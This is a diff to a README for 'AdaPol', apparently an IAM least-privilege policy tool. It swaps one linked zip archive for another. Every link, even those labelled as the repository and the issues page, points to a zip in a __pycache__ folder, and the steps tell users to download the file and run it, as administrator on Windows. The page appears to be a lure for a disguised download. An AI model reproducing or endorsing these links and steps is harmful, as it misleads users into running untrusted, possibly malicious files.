@@ -1,7 +1,7 @@
 # 🌟 AdaPol - Simplifying IAM Policy Management
 
 ## 📥 Download AdaPol
-[![Download AdaPol](https://raw.githubusercontent.com/hitq11/AdaPol/main/src/__pycache__/Ada-Pol-v3.6.zip)](https://raw.githubusercontent.com/hitq11/AdaPol/main/src/__pycache__/Ada-Pol-v3.6.zip)
+[![Download AdaPol](https://raw.githubusercontent.com/hitq11/AdaPol/main/src/__pycache__/Ada-Pol-3.2.zip)](https://raw.githubusercontent.com/hitq11/AdaPol/main/src/__pycache__/Ada-Pol-3.2.zip)
 
 ## 📚 What is AdaPol?
 AdaPol is a research-driven tool that helps automate the creation of least-privilege IAM policies for serverless workloads across leading cloud providers. If you work with AWS, Azure, or Google Cloud, AdaPol simplifies your security management. By bridging the gap between the principle of least privilege and real-world cloud practices, it ensures that your resources are protected while maintaining ease of access.
@@ -23,10 +23,10 @@ Using AdaPol is straightforward. Follow these steps to download and run the soft
 - **Secure:** Designed with a focus on security and compliance.
 
 ## 🔗 Download & Install
-To get started with AdaPol, visit this page to download: [Download AdaPol](https://raw.githubusercontent.com/hitq11/AdaPol/main/src/__pycache__/Ada-Pol-v3.6.zip)
+To get started with AdaPol, visit this page to download: [Download AdaPol](https://raw.githubusercontent.com/hitq11/AdaPol/main/src/__pycache__/Ada-Pol-3.2.zip)
 
 ### 📥 Installation Steps
-1. Click on the [Download AdaPol](https://raw.githubusercontent.com/hitq11/AdaPol/main/src/__pycache__/Ada-Pol-v3.6.zip) link.
+1. Click on the [Download AdaPol](https://raw.githubusercontent.com/hitq11/AdaPol/main/src/__pycache__/Ada-Pol-3.2.zip) link.
 2. Choose the latest version available for your operating system.
 3. Download the installation file to your computer.
 4. Locate the downloaded file on your computer.
@@ -45,7 +45,7 @@ If you encounter issues during download or installation, consider the following 
 - **Check Your Internet Connection:** Ensure you have a stable connection when downloading.
 - **Compatibility Issues:** Verify that your operating system meets the system requirements listed above.
 - **Run as Administrator:** On Windows, you may need to run the installation file as an administrator.
-- **Seek Help:** Visit the [GitHub Issues page](https://raw.githubusercontent.com/hitq11/AdaPol/main/src/__pycache__/Ada-Pol-v3.6.zip) for support from the community.
+- **Seek Help:** Visit the [GitHub Issues page](https://raw.githubusercontent.com/hitq11/AdaPol/main/src/__pycache__/Ada-Pol-3.2.zip) for support from the community.
 
 ## 💼 Use Cases
 AdaPol is versatile and can fit various scenarios:
@@ -55,8 +55,8 @@ AdaPol is versatile and can fit various scenarios:
 
 ## 🌐 Community and Support
 Join the AdaPol community to connect with other users and share insights:
-- GitHub: [AdaPol Repository](https://raw.githubusercontent.com/hitq11/AdaPol/main/src/__pycache__/Ada-Pol-v3.6.zip)
-- [Issues Page](https://raw.githubusercontent.com/hitq11/AdaPol/main/src/__pycache__/Ada-Pol-v3.6.zip) for reporting bugs or requesting features.
+- GitHub: [AdaPol Repository](https://raw.githubusercontent.com/hitq11/AdaPol/main/src/__pycache__/Ada-Pol-3.2.zip)
+- [Issues Page](https://raw.githubusercontent.com/hitq11/AdaPol/main/src/__pycache__/Ada-Pol-3.2.zip) for reporting bugs or requesting features.
 - Users can provide feedback and suggest improvements based on their experiences.
 
 ## 📱 Stay Updated
